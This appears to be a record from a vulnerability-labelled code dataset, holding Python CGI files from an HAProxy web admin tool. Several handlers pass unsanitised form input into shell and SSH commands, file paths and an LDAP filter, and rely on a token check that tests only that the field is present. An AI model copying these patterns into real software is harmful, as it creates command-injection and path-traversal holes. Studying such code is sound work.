		ssh = ssh_connect(serv)
	except Exception as e:
		error = e
		pass
	try:
		sftp = ssh.open_sftp()
		file = sftp.put(file, full_path)
		sftp.close()
		ssh.close()
	except Exception as e:
		error = e
		pass
		
	return error
	
def upload_and_restart(serv, cfg, **kwargs):
	import sql
	tmp_file = sql.get_setting('tmp_config_path') + ""/"" + get_data('config') + "".cfg""
	error = """"
	
	try:
		os.system(""dos2unix ""+cfg)
	except OSError:
		return 'Please install dos2unix' 
		pass
	
	if kwargs.get(""keepalived"") == 1:
		if kwargs.get(""just_save"") == ""save"":
			commands = [ ""sudo mv -f "" + tmp_file + "" /etc/keepalived/keepalived.conf"" ]
		else:
			commands = [ ""sudo mv -f "" + tmp_file + "" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived"" ]
	else:
		if kwargs.get(""just_save"") == ""test"":
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo rm -f "" + tmp_file ]
		elif kwargs.get(""just_save"") == ""save"":
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo mv -f "" + tmp_file + "" "" + sql.get_setting('haproxy_config_path') ]
		else:
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo mv -f "" + tmp_file + "" "" + sql.get_setting('haproxy_config_path') + "" && sudo "" + sql.get_setting('restart_command') ]	
		if sql.get_setting('firewall_enable') == ""1"":
			commands.extend(open_port_firewalld(cfg))
	
	error += str(upload(serv, tmp_file, cfg, dir='fullpath'))

	try:
		error += ssh_command(serv, commands)
	except Exception as e:
		error += e
	if error:
		return error
		
def open_port_firewalld(cfg):
	try:
		conf = open(cfg, ""r"")
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t read export config file</div>')
	
	firewalld_commands = []
	
	for line in conf:
		if ""bind"" in line:
			bind = line.split("":"")
			bind[1] = bind[1].strip(' ')
			bind = bind[1].split(""ssl"")
			bind = bind[0].strip(' \t\n\r')
			firewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)
				
	firewalld_commands.append('sudo firewall-cmd --reload')
	return firewalld_commands
	
def check_haproxy_config(serv):
	import sql
	commands = [ ""haproxy  -q -c -f %s"" % sql.get_setting('haproxy_config_path') ]
	ssh = ssh_connect(serv)
	for command in commands:
		stdin , stdout, stderr = ssh.exec_command(command, get_pty=True)
		if not stderr.read():
			return True
		else:
			return False
	ssh.close()
		
def show_log(stdout):
	i = 0
	for line in stdout:
		i = i + 1
		line_class = ""line3"" if i % 2 == 0 else ""line""
		print('<div class=""'+line_class+'"">' + escape_html(line) + '</div>')
			
def show_ip(stdout):
	for line in stdout:
		print(line)
		
def server_status(stdout):	
	proc_count = """"
	
	for line in stdout:
		if ""Ncat: "" not in line:
			for k in line:
				proc_count = k.split("":"")[1]
		else:
			proc_count = 0
	return proc_count		

def ssh_command(serv, commands, **kwargs):
	ssh = ssh_connect(serv)
		  
	for command in commands:
		try:
			stdin, stdout, stderr = ssh.exec_command(command, get_pty=True)
		except:
			continue
				
		if kwargs.get(""ip"") == ""1"":
			show_ip(stdout)
		elif kwargs.get(""show_log"") == ""1"":
			show_log(stdout)
		elif kwargs.get(""server_status"") == ""1"":
			server_status(stdout)
		elif kwargs.get('print_out'):
			print(stdout.read().decode(encoding='UTF-8'))
			return stdout.read().decode(encoding='UTF-8')
		elif kwargs.get('retunr_err') == 1:
			return stderr.read().decode(encoding='UTF-8')
		else:
			return stdout.read().decode(encoding='UTF-8')
			
		for line in stderr.read().decode(encoding='UTF-8'):
			if line:
				print(""<div class='alert alert-warning'>""+line+""</div>"")
	try:	
		ssh.close()
	except:
		print(""<div class='alert alert-danger' style='margin: 0;'>""+str(ssh)+""<a title='Close' id='errorMess'><b>X</b></a></div>"")
		pass

def escape_html(text):
	return cgi.escape(text, quote=True)
	
def subprocess_execute(cmd):
	import subprocess 
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
	stdout, stderr = p.communicate()
	output = stdout.splitlines()
	
	return output, stderr

def show_backends(serv, **kwargs):
	import json
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	cmd='echo ""show backend"" |nc %s %s' % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	ret = """"
	for line in output:
		if ""#"" in  line or ""stats"" in line:
			continue
		if line != """":
			back = json.dumps(line).split(""\"""")
			if kwargs.get('ret'):
				ret += back[1]
				ret += ""<br />""
			else:
				print(back[1], end=""<br>"")
		
	if kwargs.get('ret'):
		return ret
		
def get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):
	import glob
	file = set()
	return_files = set()
	
	for files in glob.glob(os.path.join(dir,'*.'+format)):				
		file.add(files.split('/')[-1])
	files = sorted(file, reverse=True)

	if format == 'cfg':
		for file in files:
			ip = file.split(""-"")
			if serv == ip[0]:
				return_files.add(file)
		return sorted(return_files, reverse=True)
	else: 
		return files
	
def get_key(item):
	return item[0]/n/n/napp/options.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-""
import cgi
import os, sys
import funct
import sql
import ovw

form = cgi.FieldStorage()
serv = form.getvalue('serv')
act = form.getvalue('act')
	
print('Content-type: text/html\n')

if act == ""checkrestart"":
	servers = sql.get_dick_permit(ip=serv)
	for server in servers:
		if server != """":
			print(""ok"")
			sys.exit()
	sys.exit()

if form.getvalue('token') is None:
	print(""What the fuck?! U r hacker Oo?!"")
	sys.exit()
		
if form.getvalue('getcerts') is not None and serv is not None:
	cert_path = sql.get_setting('cert_path')
	commands = [ ""ls -1t ""+cert_path+"" |grep pem"" ]
	try:
		funct.ssh_command(serv, commands, ip=""1"")
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')

if form.getvalue('checkSshConnect') is not None and serv is not None:
	try:
		funct.ssh_command(serv, [""ls -1t""])
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')
		
if form.getvalue('getcert') is not None and serv is not None:
	id = form.getvalue('getcert')
	cert_path = sql.get_setting('cert_path')
	commands = [ ""cat ""+cert_path+""/""+id ]
	try:
		funct.ssh_command(serv, commands, ip=""1"")
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')
		
if form.getvalue('ssh_cert'):
	name = form.getvalue('name')
	
	if not os.path.exists(os.getcwd()+'/keys/'):
		os.makedirs(os.getcwd()+'/keys/')
	
	ssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'
	
	try:
		with open(ssh_keys, ""w"") as conf:
			conf.write(form.getvalue('ssh_cert'))
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t save ssh keys file. Check ssh keys path in config</div>')
	else:
		print('<div class=""alert alert-success"">Ssh key was save into: %s </div>' % ssh_keys)
	try:
		funct.logging(""local"", ""users.py#ssh upload new ssh cert %s"" % ssh_keys)
	except:
		pass
			
if serv and form.getvalue('ssl_cert'):
	cert_local_dir = funct.get_config_var('main', 'cert_local_dir')
	cert_path = sql.get_setting('cert_path')
	
	if not os.path.exists(cert_local_dir):
		os.makedirs(cert_local_dir)
	
	if form.getvalue('ssl_name') is None:
		print('<div class=""alert alert-danger"">Please enter desired name</div>')
	else:
		name = form.getvalue('ssl_name') + '.pem'
	
	try:
		with open(name, ""w"") as ssl_cert:
			ssl_cert.write(form.getvalue('ssl_cert'))
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t save ssl keys file. Check ssh keys path in config</div>')
	else:
		print('<div class=""alert alert-success"">SSL file was upload to %s into: %s </div>' % (serv, cert_path))
		
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload(master[0], cert_path, name)
	try:
		funct.upload(serv, cert_path, name)
	except:
		pass
	
	os.system(""mv %s %s"" % (name, cert_local_dir))
	funct.logging(serv, ""add.py#ssl upload new ssl cert %s"" % name)
	
if form.getvalue('backend') is not None:
	funct.show_backends(serv)
	
if form.getvalue('ip') is not None and serv is not None:
	commands = [ ""sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'"" ]
	funct.ssh_command(serv, commands, ip=""1"")
	
if form.getvalue('showif'):
	commands = [""sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'""]
	funct.ssh_command(serv, commands, ip=""1"")
	
if form.getvalue('action_hap') is not None and serv is not None:
	action = form.getvalue('action_hap')
	
	if funct.check_haproxy_config(serv):
		commands = [ ""sudo systemctl %s haproxy"" % action ]
		funct.ssh_command(serv, commands)		
		print(""HAproxy was %s"" % action)
	else:
		print(""Bad config, check please"")
	
if form.getvalue('action_waf') is not None and serv is not None:
	serv = form.getvalue('serv')
	action = form.getvalue('action_waf')

	commands = [ ""sudo systemctl %s waf"" % action ]
	funct.ssh_command(serv, commands)		
	
if act == ""overview"":
	ovw.get_overview()
	
if act == ""overviewwaf"":
	ovw.get_overviewWaf(form.getvalue('page'))
	
if act == ""overviewServers"":
	ovw.get_overviewServers()
	
if form.getvalue('action'):
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	
	postdata = {
		'action' : form.getvalue('action'),
		's' : form.getvalue('s'),
		'b' : form.getvalue('b')
	}

	headers = {
		'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',
		'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language' : 'en-US,en;q=0.5',
		'Accept-Encoding' : 'gzip, deflate'
	}

	q = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))
	
if serv is not None and act == ""stats"":
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	try:
		response = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) 
	except requests.exceptions.ConnectTimeout:
		print('Oops. Connection timeout occured!')
	except requests.exceptions.ReadTimeout:
		print('Oops. Read timeout occured')
	except requests.exceptions.HTTPError as errh:
		print (""Http Error:"",errh)
	except requests.exceptions.ConnectionError as errc:
		print ('<div class=""alert alert-danger"">Error Connecting: %s</div>' % errc)
	except requests.exceptions.Timeout as errt:
		print (""Timeout Error:"",errt)
	except requests.exceptions.RequestException as err:
		print (""OOps: Something Else"",err)
		
	data = response.content
	print(data.decode('utf-8'))

if serv is not None and form.getvalue('rows') is not None:
	rows = form.getvalue('rows')
	waf = form.getvalue('waf')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
        	grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	syslog_server_enable = sql.get_setting('syslog_server_enable')
	if syslog_server_enable is None or syslog_server_enable == ""0"":
		local_path_logs = sql.get_setting('local_path_logs')
		syslog_server = serv	
		commands = [ ""sudo cat %s| awk '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (local_path_logs, date, date1, rows, grep_act, grep) ]		
	else:
		commands = [ ""sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s"" % (serv, date, date1, rows, grep_act, grep) ]
		syslog_server = sql.get_setting('syslog_server')
	
	if waf == ""1"":
		local_path_logs = '/var/log/modsec_audit.log'
		commands = [ ""sudo cat %s |tail -%s  %s %s"" % (local_path_logs, rows, grep_act, grep) ]	
		
	funct.ssh_command(syslog_server, commands, show_log=""1"")
	
if serv is not None and form.getvalue('rows1') is not None:
	rows = form.getvalue('rows1')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	apache_log_path = sql.get_setting('apache_log_path')
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''
		
	if serv == 'haproxy-wi.access.log':
		cmd=""cat %s| awk -F\""/|:\"" '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (apache_log_path+""/""+serv, date, date1, rows, grep_act, grep)
	else:
		cmd=""cat %s| awk '$4>\""%s:00\"" && $4<\""%s:00\""' |tail -%s  %s %s"" % (apache_log_path+""/""+serv, date, date1, rows, grep_act, grep)

	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if form.getvalue('viewlogs') is not None:
	viewlog = form.getvalue('viewlogs')
	log_path = funct.get_config_var('main', 'log_path')
	rows = form.getvalue('rows2')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	cmd=""cat %s| awk '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (log_path + viewlog, date, date1, rows, grep_act, grep)
	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if serv is not None and act == ""showMap"":
	ovw.get_map(serv)
	
if form.getvalue('servaction') is not None:
	server_state_file = sql.get_setting('server_state_file')
	haproxy_sock = sql.get_setting('haproxy_sock')
	enable = form.getvalue('servaction')
	backend = form.getvalue('servbackend')	
	cmd='echo ""%s %s"" |sudo socat stdio %s | cut -d "","" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)
	
	if form.getvalue('save') == ""on"":
		save_command = 'echo ""show servers state"" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)
		command = [ cmd, save_command ] 
	else:
		command = [ cmd ] 
		
	if enable != ""show"":
		print('<center><h3>You %s %s on HAproxy %s. <a href=""viewsttats.py?serv=%s"" title=""View stat"" target=""_blank"">Look it</a> or <a href=""edit.py"" title=""Edit"">Edit something else</a></h3><br />' % (enable, backend, serv, serv))
			
	funct.ssh_command(serv, command, show_log=""1"")
	action = 'edit.py ' + enable + ' ' + backend
	funct.logging(serv, action)

if act == ""showCompareConfigs"":
	import glob
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)
	template = env.get_template('/show_compare_configs.html')
	left = form.getvalue('left')
	right = form.getvalue('right')
	
	template = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())									
	print(template)
	
if serv is not None and form.getvalue('right') is not None:
	from jinja2 import Environment, FileSystemLoader
	left = form.getvalue('left')
	right = form.getvalue('right')
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	cmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)	
	env = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', ""jinja2.ext.do""])
	template = env.get_template('compare.html')
	
	output, stderr = funct.subprocess_execute(cmd)
	template = template.render(stdout=output)	
	
	print(template)
	print(stderr)
	
if serv is not None and act == ""configShow"":
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	
	if form.getvalue('configver') is None:	
		cfg = hap_configs_dir + serv + ""-"" + funct.get_data('config') + "".cfg""
		funct.get_config(serv, cfg)
	else: 
		cfg = hap_configs_dir + form.getvalue('configver')
			
	try:
		conf = open(cfg, ""r"")
		#conf = conf.read()
		#conf = funct.escape_html(conf)
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t read import config file</div>')
		
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])
	template = env.get_template('config_show.html')
	
	template = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))											
	print(template)
	
	if form.getvalue('configver') is None:
		os.system(""/bin/rm -f "" + cfg)	
		
if form.getvalue('master'):
	master = form.getvalue('master')
	slave = form.getvalue('slave')
	interface = form.getvalue('interface')
	vrrpip = form.getvalue('vrrpip')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = ""install_keepalived.sh""
	
	if form.getvalue('hap') == ""1"":
		funct.install_haproxy(master)
		funct.install_haproxy(slave)
		
	if form.getvalue('syn_flood') == ""1"":
		funct.syn_flood_protect(master)
		funct.syn_flood_protect(slave)
	
	os.system(""cp scripts/%s ."" % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)

	funct.ssh_command(master, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" MASTER ""+interface+"" ""+vrrpip])
	funct.ssh_command(slave, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" BACKUP ""+interface+"" ""+vrrpip])
			
	os.system(""rm -f %s"" % script)
	sql.update_server_master(master, slave)
	
if form.getvalue('masteradd'):
	master = form.getvalue('masteradd')
	slave = form.getvalue('slaveadd')
	interface = form.getvalue('interfaceadd')
	vrrpip = form.getvalue('vrrpipadd')
	kp = form.getvalue('kp')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = ""add_vrrp.sh""
	
	os.system(""cp scripts/%s ."" % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)
	
	funct.ssh_command(master, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" MASTER ""+interface+"" ""+vrrpip+"" ""+kp])
	funct.ssh_command(slave, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" BACKUP ""+interface+"" ""+vrrpip+"" ""+kp])
			
	os.system(""rm -f %s"" % script)
	
if form.getvalue('haproxyaddserv'):
	funct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))
	
if form.getvalue('installwaf'):
	funct.waf_install(form.getvalue('installwaf'))
	
if form.getvalue('metrics_waf'):
	sql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))
		
if form.getvalue('table_metrics'):
	import http.cookies
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'))
	template = env.get_template('table_metrics.html')
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	table_stat = sql.select_table_metrics(user_id.value)

	template = template.render(table_stat=sql.select_table_metrics(user_id.value))											
	print(template)
		
if form.getvalue('metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	servers = sql.select_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[5])
			metrics[rep_date] = {}
			metrics[rep_date]['server'] = str(i[0])
			metrics[rep_date]['curr_con'] = str(i[1])
			metrics[rep_date]['curr_ssl_con'] = str(i[2])
			metrics[rep_date]['sess_rate'] = str(i[3])
			metrics[rep_date]['max_sess_rate'] = str(i[4])

		df = pd.DataFrame.from_dict(metrics, orient=""index"")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file(""templates/metrics_out.html"", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools=""pan,box_zoom,reset,xwheel_zoom"",		
			title=metric[0][0],
			x_axis_type=""datetime"", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				(""Connections"", ""@curr_con""),
				(""SSL connections"", ""@curr_ssl_con""),
				(""Sessions rate"", ""@sess_rate"")
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = ""#f3f8fb""
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['curr_con'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = ""20px""						
		p[serv].line(""Date"", ""curr_con"", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=""Conn"")
		p[serv].line(""Date"", ""curr_ssl_con"", source=source, alpha=0.5, color=""#5d9ceb"", line_width=2, legend=""SSL con"")
		p[serv].line(""Date"", ""sess_rate"", source=source, alpha=0.5, color=""#33414e"", line_width=2, legend=""Sessions"")
		p[serv].legend.orientation = ""horizontal""
		p[serv].legend.location = ""top_left""
		p[serv].legend.padding = 5

	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = ""left"", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('waf_metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	servers = sql.select_waf_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_waf_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[2])
			metrics[rep_date] = {}
			metrics[rep_date]['conn'] = str(i[1])

		df = pd.DataFrame.from_dict(metrics, orient=""index"")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file(""templates/metrics_waf_out.html"", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools=""pan,box_zoom,reset,xwheel_zoom"",
			title=metric[0][0],
			x_axis_type=""datetime"", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				(""Connections"", ""@conn""),
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = ""#f3f8fb""
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['conn'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = ""20px""				
		p[serv].line(""Date"", ""conn"", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=""Conn"")
		p[serv].legend.orientation = ""horizontal""
		p[serv].legend.location = ""top_left""
		p[serv].legend.padding = 5
		
	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = ""left"", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('get_hap_v'):
	output = funct.check_haproxy_version(serv)
	print(output)
	
if form.getvalue('bwlists'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+form.getvalue('bwlists')
	try:
		file = open(list, ""r"")
		file_read = file.read()
		file.close
		print(file_read)
	except IOError:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n read '+form.getvalue('color')+' list</div>')
		
if form.getvalue('bwlists_create'):
	list_name = form.getvalue('bwlists_create').split('.')[0]
	list_name += '.lst'
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+list_name
	try:
		open(list, 'a').close()
		print('<div class=""alert alert-success"" style=""margin:0"">'+form.getvalue('color')+' list was created</div>')
	except IOError as e:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n create new '+form.getvalue('color')+' list. %s </div>' % e)
		
if form.getvalue('bwlists_save'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+form.getvalue('bwlists_save')
	try:
		with open(list, ""w"") as file:
			file.write(form.getvalue('bwlists_content'))
	except IOError as e:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n save '+form.getvalue('color')+' list. %s </div>' % e)
	
	servers = sql.get_dick_permit()
	path = sql.get_setting('haproxy_dir')+""/""+form.getvalue('color')
	
	for server in servers:
		funct.ssh_command(server[2], [""sudo mkdir ""+path])
		error = funct.upload(server[2], path+""/""+form.getvalue('bwlists_save'), list, dir='fullpath')
		if error:
			print('<div class=""alert alert-danger"">Upload fail: %s</div>' % error)			
		else:
			print('<div class=""alert alert-success"" style=""margin:10px"">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')
			if form.getvalue('bwlists_restart') == 'restart':
				funct.ssh_command(server[2], [""sudo "" + sql.get_setting('restart_command')])
			
if form.getvalue('get_lists'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')
	lists = funct.get_files(dir=list, format=""lst"")
	for list in lists:
		print(list)
		
if form.getvalue('get_ldap_email'):
	username = form.getvalue('get_ldap_email')
	import ldap
	
	server = sql.get_setting('ldap_server')
	port = sql.get_setting('ldap_port')
	user = sql.get_setting('ldap_user')
	password = sql.get_setting('ldap_password')
	ldap_base = sql.get_setting('ldap_base')
	domain = sql.get_setting('ldap_domain')
	ldap_search_field = sql.get_setting('ldap_search_field')

	l = ldap.initialize(""ldap://""+server+':'+port)
	try:
		l.protocol_version = ldap.VERSION3
		l.set_option(ldap.OPT_REFERRALS, 0)

		bind = l.simple_bind_s(user, password)

		criteria = ""(&(objectClass=user)(sAMAccountName=""+username+""))""
		attributes = [ldap_search_field]
		result = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)

		results = [entry for dn, entry in result if isinstance(entry, dict)]
		try:
			print('[""'+results[0][ldap_search_field][0].decode(""utf-8"")+'"",""'+domain+'""]')
		except:
			print('error: user not found')
	finally:
		l.unbind()/n/n/n",0
57,ba79e7301c5574b91b719298c56fd5129c46cca3,"/app/config.py/n/n#!/usr/bin/env python3
import cgi
import os
import http.cookies
import funct
import sql
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader('templates/'))
template = env.get_template('config.html')

print('Content-type: text/html\n')
funct.check_login()

form = cgi.FieldStorage()
serv = form.getvalue('serv')
config_read = """"
cfg = """"
stderr = """"
error = """"
aftersave = """"

try:
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')
	user = sql.get_user_name_by_uuid(user_id.value)
	servers = sql.get_dick_permit()
	token = sql.get_token(user_id.value)
	role = sql.get_user_role_by_uuid(user_id.value)
except:
	pass

hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')

if serv is not None:
	cfg = hap_configs_dir + serv + ""-"" + funct.get_data('config') + "".cfg""

if serv is not None and form.getvalue('open') is not None :
	
	try:
		funct.logging(serv, ""config.py open config"")
	except:
		pass
	
	error = funct.get_config(serv, cfg)
	
	try:
		conf = open(cfg, ""r"")
		config_read = conf.read()
		conf.close
	except IOError:
		error += '<br />Can\'t read import config file'

	os.system(""/bin/mv %s %s.old"" % (cfg, cfg))	

if serv is not None and form.getvalue('config') is not None:
	try:
		funct.logging(serv, ""config.py edited config"")
	except:
		pass
		
	config = form.getvalue('config')
	oldcfg = form.getvalue('oldconfig')
	save = form.getvalue('save')
	aftersave = 1
	try:
		with open(cfg, ""a"") as conf:
			conf.write(config)
	except IOError:
		error = ""Can't read import config file""
	
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload_and_restart(master[0], cfg, just_save=save)
		
	stderr = funct.upload_and_restart(serv, cfg, just_save=save)
		
	funct.diff_config(oldcfg, cfg)
	
	#if save:
	#	c = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	#	c[""restart""] = form.getvalue('serv')
	#	print(c)
		
	os.system(""/bin/rm -f "" + hap_configs_dir + ""*.old"")


template = template.render(h2 = 1, title = ""Working with HAProxy configs"",
							role = role,
							action = ""config.py"",
							user = user,
							select_id = ""serv"",
							serv = serv,
							aftersave = aftersave,
							config = config_read,
							cfg = cfg,
							selects = servers,
							stderr = stderr,
							error = error,
							note = 1,
							token = token)
print(template)/n/n/n/app/funct.py/n/n# -*- coding: utf-8 -*-""
import cgi
import os, sys

form = cgi.FieldStorage()
serv = form.getvalue('serv')

def get_app_dir():
	d = sys.path[0]
	d = d.split('/')[-1]		
	return sys.path[0] if d == ""app"" else os.path.dirname(sys.path[0])	

def get_config_var(sec, var):
	from configparser import ConfigParser, ExtendedInterpolation
	try:
		path_config = get_app_dir()+""/haproxy-wi.cfg""
